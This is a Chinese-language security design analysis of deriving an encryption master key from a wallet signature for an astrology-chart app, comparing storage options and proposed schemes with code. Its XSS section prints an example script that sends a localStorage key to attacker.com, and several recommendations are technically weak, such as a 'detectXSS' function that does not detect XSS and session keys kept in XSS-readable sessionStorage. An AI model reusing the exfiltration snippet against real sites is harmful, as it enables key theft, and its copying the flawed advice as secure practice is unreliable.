# 用户主密钥派生方案分析

## 📋 当前方案

```rust
MasterKey = Blake2_256("STARDUST_BAZI_V1" || wallet_signature)
```

**特点**：
- 钱包签名固定消息派生
- 存储在本地
- 永不上链

---

## 🎯 合理性分析

### ✅ 优点

| 优点 | 说明 |
|------|------|
| **确定性** | 同一钱包总是派生相同密钥 |
| **无需记忆** | 不需要用户记住密码 |
| **跨设备同步** | 只需钱包助记词即可恢复 |
| **简单易用** | 用户体验好 |
| **去中心化** | 无需第三方托管 |

### ⚠️ 潜在问题

| 问题 | 风险等级 | 说明 |
|------|---------|------|
| **签名泄露** | 🔴 高 | 签名一旦泄露，主密钥永久泄露 |
| **无法更换** | 🟡 中 | 除非换钱包，否则无法更换主密钥 |
| **本地存储风险** | 🔴 高 | 如何"安全存储在本地"？ |
| **签名确定性** | 🟡 中 | 同一消息总是相同签名 |

---

## 🔐 安全性深度分析

### 问题 1：签名泄露风险

#### 场景分析

```
用户操作流程：
1. 用户签名消息 "STARDUST_BAZI_V1"
2. 签名值 = wallet.sign("STARDUST_BAZI_V1")
3. MasterKey = Blake2_256(signature)

潜在泄露途径：
❌ 恶意 DApp 请求签名相同消息
❌ 钓鱼网站诱导用户签名
❌ 浏览器扩展窃取签名
❌ 中间人攻击截获签名
```

#### 风险评估

**如果签名泄露**：
```
攻击者获得 signature
  ↓
计算 MasterKey = Blake2_256(signature)
  ↓
派生所有 ChartKey
  ↓
解密所有命盘数据
```

**结论**：🔴 **高风险** - 单点失败，无法恢复

---

### 问题 2：本地存储的安全性

#### 存储方案对比

| 方案 | 安全性 | 可用性 | 风险 |
|------|--------|--------|------|
| **LocalStorage** | ❌ 低 | ✅ 高 | XSS 攻击可读取 |
| **SessionStorage** | ⚠️ 中 | ❌ 低 | 会话结束即丢失 |
| **IndexedDB** | ❌ 低 | ✅ 高 | XSS 攻击可读取 |
| **Memory Only** | ✅ 高 | ❌ 低 | 刷新页面即丢失 |
| **Web Crypto (non-extractable)** | ✅ 高 | ⚠️ 中 | 无法导出，但刷新丢失 |

#### XSS 攻击示例

```javascript
// 恶意脚本注入
<script>
  // 读取 LocalStorage 中的主密钥
  const masterKey = localStorage.getItem('masterKey');
  
  // 发送到攻击者服务器
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: masterKey
  });
</script>
```

**结论**：🔴 **高风险** - 前端存储密钥极不安全

---

### 问题 3：签名确定性

#### Ed25519/Sr25519 签名特性

```rust
// Substrate 钱包签名是确定性的
let signature1 = wallet.sign("STARDUST_BAZI_V1");
let signature2 = wallet.sign("STARDUST_BAZI_V1");

assert_eq!(signature1, signature2);  // ✅ 总是相等
```

**影响**：
- ✅ 优点：可重复派生，跨设备一致
- ⚠️ 缺点：签名可预测，容易被钓鱼

---

## 🛡️ 改进方案

### 方案 A：不存储，每次派生（推荐）

```typescript
// ✅ 每次需要时重新派生
async function getMasterKey(wallet: Wallet): Promise<Uint8Array> {
    // 1. 提示用户签名（带警告）
    const message = "STARDUST_BAZI_V1\n\n⚠️ 警告：此签名用于派生加密密钥，请勿在其他网站签名相同消息！";
    
    const signature = await wallet.signMessage(message);
    
    // 2. 派生密钥
    const masterKey = blake2_256(signature);
    
    return masterKey;
}

// ✅ 使用完立即清除
async function useEncryption(wallet: Wallet, callback: Function) {
    const masterKey = await getMasterKey(wallet);
    
    try {
        await callback(masterKey);
    } finally {
        // 清零内存
        masterKey.fill(0);
    }
}

// 使用示例
await useEncryption(wallet, async (masterKey) => {
    const chartKey = deriveChartKey(masterKey, chartId);
    const decrypted = await decrypt(encrypted, chartKey);
    // ... 处理数据
});
// masterKey 已被清零
```

**优点**：
- ✅ 不存储密钥，无泄露风险
- ✅ 每次使用后立即清除
- ✅ 简单可靠

**缺点**：
- ⚠️ 每次操作需要签名（用户体验稍差）
- ⚠️ 频繁签名可能引起用户疲劳

---

### 方案 B：使用 HKDF + 增强安全性

```typescript
import { hkdf } from '@noble/hashes/hkdf';
import { sha256 } from '@noble/hashes/sha256';

async function deriveMasterKey(wallet: Wallet): Promise<Uint8Array> {
    // 1. 签名消息（包含域分隔符）
    const domain = "STARDUST_BAZI_MASTER_KEY_V1";
    const message = `${domain}\n\nTimestamp: ${Date.now()}\nNonce: ${crypto.randomUUID()}`;
    
    const signature = await wallet.signMessage(message);
    
    // 2. 使用 HKDF 派生（符合 RFC 5869）
    const masterKey = hkdf(
        sha256,
        signature,
        domain,  // salt
        domain,  // info
        32       // output length
    );
    
    return masterKey;
}
```

**优点**：
- ✅ 符合密码学标准（RFC 5869）
- ✅ 更强的安全保证
- ✅ 支持多个派生密钥

**缺点**：
- ⚠️ 每次签名不同（无法跨设备同步）
- ⚠️ 需要额外存储 nonce

---

### 方案 C：混合方案 - 会话密钥 + 主密钥（最佳）

```typescript
// 架构设计
┌─────────────────────────────────────────────────────────────┐
│                    用户钱包                                  │
│              (永不暴露私钥)                                  │
└────────────────────┬────────────────────────────────────────┘
                     │
                     │ 签名一次
                     ▼
┌─────────────────────────────────────────────────────────────┐
│                 主密钥 (MasterKey)                           │
│           Blake2_256(signature)                             │
│           永不存储，仅用于派生会话密钥                        │
└────────────────────┬────────────────────────────────────────┘
                     │
                     │ 派生
                     ▼
┌─────────────────────────────────────────────────────────────┐
│              会话密钥 (SessionKey)                           │
│           HKDF(MasterKey, session_id, timestamp)            │
│           存储在 SessionStorage（会话结束自动清除）           │
└────────────────────┬────────────────────────────────────────┘
                     │
                     │ 派生
                     ▼
┌─────────────────────────────────────────────────────────────┐
│              命盘密钥 (ChartKey)                             │
│           HKDF(SessionKey, chart_id)                        │
└─────────────────────────────────────────────────────────────┘
```

#### 实现代码

```typescript
// 1. 初始化会话（用户登录时执行一次）
async function initSession(wallet: Wallet): Promise<void> {
    // 签名一次
    const signature = await wallet.signMessage("STARDUST_BAZI_V1");
    const masterKey = blake2_256(signature);
    
    // 派生会话密钥
    const sessionId = crypto.randomUUID();
    const timestamp = Date.now();
    const sessionKey = hkdf(
        sha256,
        masterKey,
        `SESSION_${sessionId}`,
        `${timestamp}`,
        32
    );
    
    // 清除主密钥
    masterKey.fill(0);
    
    // 存储会话密钥（SessionStorage，会话结束自动清除）
    sessionStorage.setItem('sessionKey', base64Encode(sessionKey));
    sessionStorage.setItem('sessionId', sessionId);
    sessionStorage.setItem('sessionExpiry', (timestamp + 3600000).toString()); // 1小时
}

// 2. 获取会话密钥
function getSessionKey(): Uint8Array | null {
    const sessionKey = sessionStorage.getItem('sessionKey');
    const expiry = parseInt(sessionStorage.getItem('sessionExpiry') || '0');
    
    // 检查是否过期
    if (Date.now() > expiry) {
        clearSession();
        return null;
    }
    
    return sessionKey ? base64Decode(sessionKey) : null;
}

// 3. 派生命盘密钥
function deriveChartKey(chartId: bigint): Uint8Array {
    const sessionKey = getSessionKey();
    if (!sessionKey) {
        throw new Error("Session expired, please sign in again");
    }
    
    return hkdf(
        sha256,
        sessionKey,
        `CHART_${chartId}`,
        'chart_key',
        32
    );
}

// 4. 清除会话
function clearSession(): void {
    sessionStorage.removeItem('sessionKey');
    sessionStorage.removeItem('sessionId');
    sessionStorage.removeItem('sessionExpiry');
}
```

**优点**：
- ✅ 用户只需签名一次（会话期间）
- ✅ 会话密钥自动过期（1小时）
- ✅ 关闭浏览器自动清除
- ✅ 主密钥永不存储
- ✅ 平衡安全性和用户体验

**缺点**：
- ⚠️ 会话过期需要重新签名
- ⚠️ 跨标签页需要特殊处理

---

### 方案 D：硬件密钥 + 生物识别（未来方向）

```typescript
// 使用 WebAuthn API
async function deriveMasterKeyWithWebAuthn(wallet: Wallet): Promise<Uint8Array> {
    // 1. 创建凭证（首次）
    const credential = await navigator.credentials.create({
        publicKey: {
            challenge: new Uint8Array(32),
            rp: { name: "Stardust Bazi" },
            user: {
                id: wallet.address,
                name: wallet.address,
                displayName: "Bazi User"
            },
            pubKeyCredParams: [{ alg: -7, type: "public-key" }],
            authenticatorSelection: {
                authenticatorAttachment: "platform",  // 使用设备内置认证器
                userVerification: "required"          // 需要生物识别
            }
        }
    });
    
    // 2. 使用凭证派生密钥
    const assertion = await navigator.credentials.get({
        publicKey: {
            challenge: new Uint8Array(32),
            rpId: "stardust.io",
            userVerification: "required"
        }
    });
    
    // 3. 从认证器响应派生密钥
    const masterKey = blake2_256(assertion.response.signature);
    
    return masterKey;
}
```

**优点**：
- ✅ 硬件级安全
- ✅ 生物识别（指纹/面容）
- ✅ 防钓鱼（域名绑定）

**缺点**：
- ⚠️ 浏览器兼容性
- ⚠️ 需要硬件支持
- ⚠️ 实现复杂

---

## 📊 方案对比

| 方案 | 安全性 | 用户体验 | 跨设备 | 实现难度 | 推荐度 |
|------|--------|---------|--------|---------|--------|
| **当前方案（存储）** | ❌ 低 | ✅ 好 | ✅ 支持 | ✅ 简单 | ⭐⭐ |
| **方案 A（不存储）** | ✅ 高 | ⚠️ 中 | ✅ 支持 | ✅ 简单 | ⭐⭐⭐⭐ |
| **方案 B（HKDF）** | ✅ 高 | ⚠️ 中 | ❌ 不支持 | ⚠️ 中等 | ⭐⭐⭐ |
| **方案 C（会话密钥）** | ✅ 高 | ✅ 好 | ✅ 支持 | ⚠️ 中等 | ⭐⭐⭐⭐⭐ |
| **方案 D（WebAuthn）** | ✅ 极高 | ✅ 好 | ⚠️ 部分 | ❌ 复杂 | ⭐⭐⭐⭐ |

---

## 🎯 推荐方案

### 短期实施：方案 C（会话密钥）

```typescript
// 用户登录时签名一次
await initSession(wallet);

// 会话期间（1小时）无需再次签名
const chartKey = deriveChartKey(chartId);
const decrypted = decrypt(encrypted, chartKey);

// 会话过期或关闭浏览器自动清除
```

**理由**：
1. ✅ 安全性高（主密钥不存储）
2. ✅ 用户体验好（只签名一次）
3. ✅ 实现难度适中
4. ✅ 跨设备支持（钱包助记词）

### 长期规划：方案 D（WebAuthn）

作为可选的增强安全选项，供高级用户使用。

---

## ⚠️ 安全建议

### 1. 签名消息设计

```typescript
// ❌ 不好：简单消息
const message = "STARDUST_BAZI_V1";

// ✅ 好：包含警告和上下文
const message = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  密钥派生签名请求
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

应用：Stardust Bazi (stardust.io)
用途：派生加密密钥
版本：V1

⚠️ 警告：
- 此签名用于派生您的主加密密钥
- 请勿在其他网站签名相同消息
- 签名泄露将导致数据泄露

时间戳：${Date.now()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
```

### 2. 前端安全检查

```typescript
// 检测 XSS 攻击
function detectXSS(): boolean {
    // 检查是否在 iframe 中
    if (window.self !== window.top) {
        console.error("Detected iframe embedding");
        return true;
    }
    
    // 检查域名
    if (!window.location.hostname.endsWith('stardust.io')) {
        console.error("Invalid domain");
        return true;
    }
    
    // 检查 HTTPS
    if (window.location.protocol !== 'https:') {
        console.error("Not using HTTPS");
        return true;
    }
    
    return false;
}

// 使用前检查
if (detectXSS()) {
    throw new Error("Security check failed");
}
```

### 3. 内容安全策略（CSP）

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'wasm-unsafe-eval';
    connect-src 'self' wss://rpc.stardust.io;
    img-src 'self' data: https:;
    style-src 'self' 'unsafe-inline';
    frame-ancestors 'none';
">
```

---

## 🎯 最终结论

### 当前方案评估

**合理性**：⭐⭐ (2/5)
- ✅ 思路正确（钱包签名派生）
- ❌ 存储方式不安全

**可行性**：⭐⭐⭐ (3/5)
- ✅ 技术可行
- ⚠️ 安全风险高

### 推荐改进

**立即实施**：
1. ✅ 不存储主密钥，每次派生
2. ✅ 使用会话密钥机制
3. ✅ 添加安全警告

**中期优化**：
1. ⭐ 使用 HKDF 标准
2. ⭐ 实现会话管理
3. ⭐ 添加安全检查

**长期规划**：
1. 💡 支持 WebAuthn
2. 💡 硬件密钥集成
3. 💡 多因素认证

---

**总结**：当前方案的**思路正确**，但**存储方式不安全**。建议采用**方案 C（会话密钥）**，既保证安全性，又提供良好的用户体验。
